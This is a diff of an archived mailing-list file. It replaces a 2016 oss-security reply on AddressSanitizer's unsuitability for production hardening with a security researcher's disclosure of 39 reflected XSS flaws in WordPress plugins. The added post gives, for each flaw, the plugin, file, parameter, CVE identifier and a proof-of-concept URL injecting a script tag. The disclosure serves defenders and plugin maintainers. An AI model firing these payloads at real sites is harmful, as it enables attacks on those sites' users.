@@ -1,85 +1,60 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/19/3
-Message-ID: <1455850474.924.9.camel@gmail.com>
-Date: Thu, 18 Feb 2016 21:54:34 -0500
-From: Daniel Micay <danielmicay@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: Address Sanitizer local root
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/12/8
+Message-id: <9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>
+Date: Tue, 12 Apr 2016 08:48:01 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: 39 XSS vulnerabilities in 35 wordpress plugins.
 Content-Type: text/plain; charset=utf-8
 
-On Thu, 2016-02-18 at 11:08 +0100, Hanno Böck wrote:
-> Hi,
-> 
-> Thanks a lot for your analysis.
-> 
-> On Wed, 17 Feb 2016 23:19:21 +0100
-> Szabolcs Nagy <nsz@...t70.net> wrote:
-> 
-> > 
-> > https://blog.hboeck.de/archives/879-Safer-use-of-C-code-running-Gent
-> > oo-with-Address-Sanitizer.html
-> > (the later was presented at FOSDEM 2016:
-> > https://fosdem.org/2016/schedule/event/csafecode/ )
-> > 
-> > While these are interesting projects, ASan should not be
-> > used for hardening in production systems in its current form,
-> > so at least the language ("hardening", "protection", "safe")
-> > should be fixed.
-> Given that this is my work (I did the asanized Gentoo and the FOSDEM
-> talk) I think I should answer.
-> 
-> I hope I have made it clear that whether using asan for production
-> purposes makes any sense was an open question to me. I have placed
-> warnings that this is experimental and I didn't recommend any
-> production
-> use right now.
-> 
-> I was aware about the performance and memory costs of asan, and I was
-> aware that there are risks involved, but it appeared to me that
-> balancing issues out it would still be a security win and might
-> therefore be an option for some highly security sensitive
-> environments.
-> Your mail makes it clear to me that I was in error and at least in its
-> current form asan is probably not suitable for secure use at all.
-> I will add a note to my blogpost and the Gentoo wiki with a link to
-> your mail to make this clear.
-> 
-> 
-> Appart from that I wonder whether this should have any consequences
-> for
-> asan and which ones. Would it be desirable to:
-> a) Try to fix security issues like the one you presented with suid
-> binaries? (not sure what the best fix would be, maybe detect suid
-> binaries and drop privileges back to user [not sure if that's even
-> possible]).
-> b) Leave issues unfixed and declare that asan is just not good for
-> production use. In this case I agree that the asan documentation
-> should
-> probably include some more obvious warnings / explanations of the
-> risks involved.
-> c) Some other variant, like splitting asan into two different
-> variants.
-> One could imagine having a new cflag that would enable asan, but
-> disable some of the ASAN_OPTIONS things like logging (however thinking
-> about this I don't like it - if I imagine running asan on some kind of
-> server I would want to be able to log issues).
+Hello List,
 
-Since it's not providing full bounds checking but rather approximate
-bounds checking catching most common cases it's not clear how well the
-design would work for hardening even with a security-oriented runtime
-for ASan. It's also still going to significantly weaken ASLR even with a
-hardened runtime. Security features need a clear threat model and ASan
-doesn't have a threat model, since it's a debugging feature. It doesn't
-provide memory safety but rather detection of common cases of memory
-corruption. An approach to memory safety in C without mass rewrites of
-code into an annotated subset would need to be drastically different
-than the ASan design.
 
-A large part of the quarantine-based hardening for lifetime issues (use-
-after-free, double-free) can be provided by a hardened malloc without
-the same drawbacks so that part is less interesting from a hardening
-perspective. Bounds checking is obviously important, but people aren't
-getting what they think they are when they're using ASan as that kind of
-mitigation. It can be bypassed in general. It's not simply a matter of
-hardening it. You want something else.
-Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
+This was a project I worked on as part of my research in Akamai's SIRT, I initially found 1352 suspect XSS vulnerabilities but Wordpress escapes super globals GET/POST/REQUEST
+https://core.trac.wordpress.org/ticket/18322.  I didn't know this at the time, so now I have a database of vulnerabilities that are context dependent and would need to be examined
+individually.  I managed to automate XSS testing against the database and of 1352 39 successfully executed javascript.  These are those 39, I've manually verified they're still vulnerable.
+
+They're available here http://www.vapidlabs.com/wp/wp.php
+
+I notified Wordpress back in February of my research.
+
+
+Plugin:https://wordpress.org/plugins/mousewheel-smooth-scroll File:./mousewheel-smooth-scroll/js/wpmss.php Parameter:ease  speed step CVE-2016-77447 PoC:hxxp://[target]/wp-content/plugins/mousewheel-smooth-scroll/js/wpmss.php?step="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/indexisto File:./indexisto/assets/js/indexisto-inject.php Parameter:indexisto_index CVE-2016-77360 PoC:hxxp://[target]/wp-content/plugins/indexisto/assets/js/indexisto-inject.php?indexisto_index="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/prettypre File:./prettypre/prettyprecss.php Parameter:ts CVE-2016-77548 PoC:hxxp://[target]/wp-content/plugins/prettypre/prettyprecss.php?ts="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/whizz File:./whizz/plugins/delete-plugin.php Parameter:plugin CVE-2016-77799 PoC:hxxp://[target]/wp-content/plugins/whizz/plugins/delete-plugin.php?plugin="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/mypuzzle-jigsaw File:./mypuzzle-jigsaw/getGallery.php Parameter:callback CVE-2016-77465 PoC:hxxp://[target]/wp-content/plugins/mypuzzle-jigsaw/getGallery.php?callback="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/anti-plagiarism File:./anti-plagiarism/js.php Parameter:m CVE-2016-77035 PoC:hxxp://[target]/wp-content/plugins/anti-plagiarism/js.php?m="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/qoate-scroll-triggered-box File:./qoate-scroll-triggered-box/assets/js/script.php Parameter:anim perc sac vpos CVE-2016-77559 PoC:hxxp://[target]/wp-content/plugins/qoate-scroll-triggered-box/assets/js/script.php?anim="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/s3-video File:./s3-video/views/video-management/preview_video.php Parameter:media CVE-2016-77600 PoC:hxxp://[target]/wp-content/plugins/s3-video/views/video-management/preview_video.php?media="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/wpsolr-search-engine File:./wpsolr-search-engine/classes/extensions/managed-solr-servers/templates/template-my-accounts.php Parameter:page  tab CVE-2016-77958 PoC:hxxp://[target]/wp-content/plugins/wpsolr-search-engine/classes/extensions/managed-solr-servers/templates/template-my-accounts.php?page="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/page-layout-builder File:./page-layout-builder/includes/layout-settings.php Parameter:layout_settings_id CVE-2016-77503 PoC:hxxp://[target]/wp-content/plugins/page-layout-builder/includes/layout-settings.php?layout_settings_id="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/mypuzzle-sliding File:./mypuzzle-sliding/getGallery.php Parameter:callback CVE-2016-77466 PoC:hxxp://[target]/wp-content/plugins/mypuzzle-sliding/getGallery.php?callback="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/e-search File:./e-search/tmpl/date_select.php Parameter:date-from date-to CVE-2016-77217 PoC:hxxp://[target]/wp-content/plugins/e-search/tmpl/date_select.php?date-from="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/e-search File:./e-search/tmpl/title_az.php Parameter:title_az CVE-2016-77217 PoC:hxxp://[target]/wp-content/plugins/e-search/tmpl/title_az.php?title_az="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/tidio-gallery File:./tidio-gallery/popup-insert-help.php Parameter:galleryId id  tidio-gallery CVE-2016-77727 PoC:hxxp://[target]/wp-content/plugins/tidio-gallery/popup-insert-help.php?galleryId="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/parsi-font File:./parsi-font/css.php Parameter:font size CVE-2016-77506 PoC:hxxp://[target]/wp-content/plugins/parsi-font/css.php?size="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/defa-online-image-protector File:./defa-online-image-protector/redirect.php Parameter:r CVE-2016-77193 PoC:hxxp://[target]/wp-content/plugins/defa-online-image-protector/redirect.php?r="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/new-year-firework File:./new-year-firework/firework/index.php Parameter:music text url CVE-2016-77475 PoC:hxxp://[target]/wp-content/plugins/new-year-firework/firework/index.php?text="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/simpel-reserveren File:./simpel-reserveren/edit.php Parameter:page CVE-2016-77628 PoC:hxxp://[target]/wp-content/plugins/simpel-reserveren/edit.php?page="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/groupon-widget File:./groupon-widget/widget.css.php Parameter:grpn_wdgt_get_it_btn_background grpn_wdgt_link_color grpn_wdgt_price_tag_background grpn_wdgt_shell_background grpn_wdgt_text_color grpn_wdgt_title_color CVE-2016-77332 PoC:hxxp://[target]/wp-content/plugins/groupon-widget/widget.css.php?grpn_wdgt_shell_background="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/wp-notifications File:./wp-notifications/css/ln_livenotifications_css.php Parameter:banner_bgcolor dropdown_bit_bgcolor dropdown_bit_color dropdown_boder_color dropdown_color dropdown_hover_bgcolor dropdown_link_color CVE-2016-77885 PoC:hxxp://[target]/wp-content/plugins/wp-notifications/css/ln_livenotifications_css.php?dropdown_color="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/wp-latest-posts File:./wp-latest-posts/js/wpcufpn_front.js.php Parameter:id CVE-2016-77873 PoC:hxxp://[target]/wp-content/plugins/wp-latest-posts/js/wpcufpn_front.js.php?id="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/ajax-random-post File:./ajax-random-post/js.php Parameter:count interval CVE-2016-77022 PoC:hxxp://[target]/wp-content/plugins/ajax-random-post/js.php?interval="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/admin-font-editor File:./admin-font-editor/css.php Parameter:font size CVE-2016-77009 PoC:hxxp://[target]/wp-content/plugins/admin-font-editor/css.php?size="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/hdw-tube File:./hdw-tube/playlist.php Parameter:playlist CVE-2016-77337 PoC:hxxp://[target]/wp-content/plugins/hdw-tube/playlist.php?playlist="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/hdw-tube File:./hdw-tube/mychannel.php Parameter:channel CVE-2016-77337 PoC:hxxp://[target]/wp-content/plugins/hdw-tube/mychannel.php?channel="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/lbak-google-checkout File:./lbak-google-checkout/css/googlecheckout.php Parameter:ih iw ph pw tc CVE-2016-77395 PoC:hxxp://[target]/wp-content/plugins/lbak-google-checkout/css/googlecheckout.php?pw="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/razuna-media-manager File:./razuna-media-manager/pages/ajax/razuna-upload-callback.php Parameter:message responsecode CVE-2016-77577 PoC:hxxp://[target]/wp-content/plugins/razuna-media-manager/pages/ajax/razuna-upload-callback.php?responsecode="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/mypuzzle-find-the-pair-a-memory-game File:./mypuzzle-find-the-pair-a-memory-game/ftpair-getCardImages.php Parameter:callback CVE-2016-77464 PoC:hxxp://[target]/wp-content/plugins/mypuzzle-find-the-pair-a-memory-game/ftpair-getCardImages.php?callback="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/surveymonkey-button File:./surveymonkey-button/start_survey.php Parameter:jqueryPepPath CVE-2016-77702 PoC:hxxp://[target]/wp-content/plugins/surveymonkey-button/start_survey.php?jqueryPepPath="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/hero-maps-pro File:./hero-maps-pro/views/dashboard/index.php Parameter:p v CVE-2016-77341 PoC:hxxp://[target]/wp-content/plugins/hero-maps-pro/views/dashboard/index.php?v="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/bbpress-social-network File:./bbpress-social-network/css/ln_livenotifications_css.php Parameter:banner_bgcolor dropdown_bit_bgcolor dropdown_bit_color dropdown_boder_color dropdown_color dropdown_hover_bgcolor dropdown_link_color CVE-2016-77074 PoC:hxxp://[target]/wp-content/plugins/bbpress-social-network/css/ln_livenotifications_css.php?dropdown_color="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/bbpress-social-network File:./bbpress-social-network/css/ln_livenotifications_cssback.php Parameter:banner_bgcolor dropdown_bgcolor dropdown_bit_bgcolor dropdown_bit_color dropdown_boder_color dropdown_color dropdown_hover_bgcolor dropdown_link_color CVE-2016-77074 PoC:hxxp://[target]/wp-content/plugins/bbpress-social-network/css/ln_livenotifications_cssback.php?dropdown_bgcolor="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/photoxhibit File:./photoxhibit/common/inc/pages/edit_styles.php Parameter:gid CVE-2016-77517 PoC:hxxp://[target]/wp-content/plugins/photoxhibit/common/inc/pages/edit_styles.php?gid="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/photoxhibit File:./photoxhibit/common/inc/pages/build.php Parameter:gid CVE-2016-77517 PoC:hxxp://[target]/wp-content/plugins/photoxhibit/common/inc/pages/build.php?gid="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/pondol-formmail File:./pondol-formmail/pages/admin-mail-info.php Parameter:itemid CVE-2016-77532 PoC:hxxp://[target]/wp-content/plugins/pondol-formmail/pages/admin-mail-info.php?itemid="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/heat-trackr File:./heat-trackr/heat-trackr_abtest_add.php Parameter:id N  WPSLT CVE-2016-77339 PoC:hxxp://[target]/wp-content/plugins/heat-trackr/heat-trackr_abtest_add.php?id="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/tidio-form File:./tidio-form/popup-insert-help.php Parameter:formId id  tidio-form CVE-2016-77726 PoC:hxxp://[target]/wp-content/plugins/tidio-form/popup-insert-help.php?formId="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/simplified-content File:./simplified-content/ooawpframework/js/ajax/OOAAjax.js.php Parameter:ajaxURL CVE-2016-77642 PoC:hxxp://[target]/wp-content/plugins/simplified-content/ooawpframework/js/ajax/OOAAjax.js.php?ajaxURL="><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/infusionsoft File:./infusionsoft/Infusionsoft/examples/leadscoring.php Parameter:ContactId CVE-2016-77364 PoC:hxxp://[target]/wp-content/plugins/infusionsoft/Infusionsoft/examples/leadscoring.php?ContactId="><script>alert(1);</script><"
